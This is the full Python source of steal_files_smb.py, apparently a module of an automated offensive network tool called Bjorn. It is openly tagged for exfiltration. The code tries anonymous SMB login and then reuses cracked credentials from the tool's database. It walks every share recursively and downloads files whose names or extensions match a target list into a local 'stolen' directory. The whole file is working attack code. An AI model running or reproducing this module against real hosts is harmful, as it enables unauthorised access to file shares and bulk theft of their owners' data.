"""steal_files_smb.py - Loot files from SMB shares using cracked or anonymous credentials."""

import os
import logging
import time
from threading import Timer
from typing import List, Tuple, Dict, Optional

from smb.SMBConnection import SMBConnection
from shared import SharedData
from logger import Logger

logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)

b_class  = "StealFilesSMB"
b_module = "steal_files_smb"
b_status = "steal_files_smb"
b_parent = "SMBBruteforce"
b_port   = 445
b_enabled = 1
b_action = "normal"
b_service = '["smb"]'
b_trigger = 'on_any:["on_cred_found:smb","on_service:smb"]'
b_requires = '{"all":[{"has_cred":"smb"},{"has_port":445}]}'
b_priority = 60
b_cooldown = 3600
b_timeout = 600
b_stealth_level = 5
b_risk_level = "high"
b_max_retries = 1
b_tags = ["exfil", "smb", "loot", "files"]
b_category = "exfiltration"
b_name = "Steal Files SMB"
b_description = "Loot files from SMB shares using cracked or anonymous credentials."
b_author = "Bjorn Team"
b_version = "2.0.0"
b_icon = "StealFilesSMB.png"


class StealFilesSMB:
    def __init__(self, shared_data: SharedData):
        self.shared_data = shared_data
        self.smb_connected = False
        self.stop_execution = False
        self.IGNORED_SHARES = set(self.shared_data.ignored_smb_shares or [])
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()
        logger.info("StealFilesSMB initialized")

    # -------- Identity cache --------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []
        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # -------- Creds (grouped by share) --------
    def _get_creds_by_share(self, ip: str, port: int) -> Dict[str, List[Tuple[str, str]]]:
        """
        Returns {share: [(user,pass), ...]} from DB.creds (service='smb', database=share).
        Prefer IP; also include MAC if known. Dedup per share.
        """
        mac = self.mac_for_ip(ip)
        params = {"ip": ip, "port": port, "mac": mac or ""}

        by_ip = self.shared_data.db.query(
            """
            SELECT "user","password","database"
              FROM creds
             WHERE service='smb'
               AND COALESCE(ip,'')=:ip
               AND (port IS NULL OR port=:port)
            """, params)

        by_mac = []
        if mac:
            by_mac = self.shared_data.db.query(
                """
                SELECT "user","password","database"
                  FROM creds
                 WHERE service='smb'
                   AND COALESCE(mac_address,'')=:mac
                   AND (port IS NULL OR port=:port)
                """, params)

        out: Dict[str, List[Tuple[str, str]]] = {}
        seen: Dict[str, set] = {}
        for row in (by_ip + by_mac):
            share = str(row.get("database") or "").strip()
            user  = str(row.get("user") or "").strip()
            pwd   = str(row.get("password") or "").strip()
            if not user or not share:
                continue
            if share not in out:
                out[share], seen[share] = [], set()
            if (user, pwd) in seen[share]:
                continue
            seen[share].add((user, pwd))
            out[share].append((user, pwd))
        return out

    # -------- SMB helpers --------
    def connect_smb(self, ip: str, username: str, password: str) -> Optional[SMBConnection]:
        try:
            conn = SMBConnection(username, password, "Bjorn", "Target", use_ntlm_v2=True, is_direct_tcp=True)
            conn.connect(ip, b_port)
            self.smb_connected = True
            logger.info(f"Connected SMB {ip} as {username}")
            return conn
        except Exception as e:
            logger.error(f"SMB connect error {ip} {username}: {e}")
            return None

    def list_shares(self, conn: SMBConnection):
        try:
            shares = conn.listShares()
            return [s for s in shares if (s.name not in self.IGNORED_SHARES and not s.isSpecial and not s.isTemporary)]
        except Exception as e:
            logger.error(f"list_shares error: {e}")
            return []

    def find_files(self, conn: SMBConnection, share: str, dir_path: str) -> List[str]:
        files: List[str] = []
        try:
            for entry in conn.listPath(share, dir_path):
                if self.shared_data.orchestrator_should_exit or self.stop_execution:
                    logger.info("File search interrupted.")
                    return []
                if entry.isDirectory:
                    if entry.filename not in ('.', '..'):
                        files.extend(self.find_files(conn, share, os.path.join(dir_path, entry.filename)))
                else:
                    name = entry.filename
                    if any(name.endswith(ext) for ext in (self.shared_data.steal_file_extensions or [])) or \
                       any(sn in name for sn in (self.shared_data.steal_file_names or [])):
                        files.append(os.path.join(dir_path, name))
            return files
        except Exception as e:
            logger.error(f"SMB path error {share}:{dir_path}: {e}")
            raise

    def steal_file(self, conn: SMBConnection, share: str, remote_file: str, base_dir: str) -> None:
        try:
            local_file_path = os.path.join(base_dir, os.path.relpath(remote_file, '/'))
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            with open(local_file_path, 'wb') as f:
                conn.retrieveFile(share, remote_file, f)
            logger.success(f"Downloaded {share}:{remote_file} -> {local_file_path}")
        except Exception as e:
            logger.error(f"SMB download error {share}:{remote_file}: {e}")

    # -------- Orchestrator entry --------
    def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
        try:
            self.shared_data.bjorn_orch_status = b_class
            # EPD live status
            self.shared_data.comment_params = {"ip": ip, "port": str(port), "share": "?", "files": "0"}
            try:
                port_i = int(port)
            except Exception:
                port_i = b_port

            creds_by_share = self._get_creds_by_share(ip, port_i)
            logger.info(f"Found SMB creds for {len(creds_by_share)} share(s) in DB for {ip}")

            def _timeout():
                if not self.smb_connected:
                    logger.error(f"No SMB connection within 4 minutes for {ip}. Failing.")
                    self.stop_execution = True

            timer = Timer(240, _timeout)
            timer.start()

            mac = (row or {}).get("MAC Address") or self.mac_for_ip(ip) or "UNKNOWN"
            success = False

            # Anonymous first (''/'')
            try:
                conn = self.connect_smb(ip, '', '')
                if conn:
                    shares = self.list_shares(conn)
                    for s in shares:
                        files = self.find_files(conn, s.name, '/')
                        if files:
                            base = os.path.join(self.shared_data.data_stolen_dir, f"smb/{mac}_{ip}/{s.name}")
                            for remote in files:
                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                    logger.info("Execution interrupted.")
                                    break
                                self.steal_file(conn, s.name, remote, base)
                            logger.success(f"Stole {len(files)} files from {ip} via anonymous on {s.name}")
                            success = True
                    try:
                        conn.close()
                    except Exception:
                        pass
            except Exception as e:
                logger.info(f"Anonymous SMB failed on {ip}: {e}")

            if success:
                timer.cancel()
                return 'success'

            # Per-share credentials
            for share, creds in creds_by_share.items():
                if share in self.IGNORED_SHARES:
                    continue
                for username, password in creds:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("Execution interrupted.")
                        break
                    try:
                        conn = self.connect_smb(ip, username, password)
                        if not conn:
                            continue
                        files = self.find_files(conn, share, '/')
                        if files:
                            base = os.path.join(self.shared_data.data_stolen_dir, f"smb/{mac}_{ip}/{share}")
                            for remote in files:
                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                    logger.info("Execution interrupted.")
                                    break
                                self.steal_file(conn, share, remote, base)
                            logger.info(f"Stole {len(files)} files from {ip} share={share} as {username}")
                            success = True
                        try:
                            conn.close()
                        except Exception:
                            pass
                        if success:
                            timer.cancel()
                            return 'success'
                    except Exception as e:
                        logger.error(f"SMB loot error {ip} {share} {username}: {e}")

            timer.cancel()
            return 'success' if success else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'
        finally:
            self.shared_data.bjorn_progress = ""
            self.shared_data.comment_params = {}
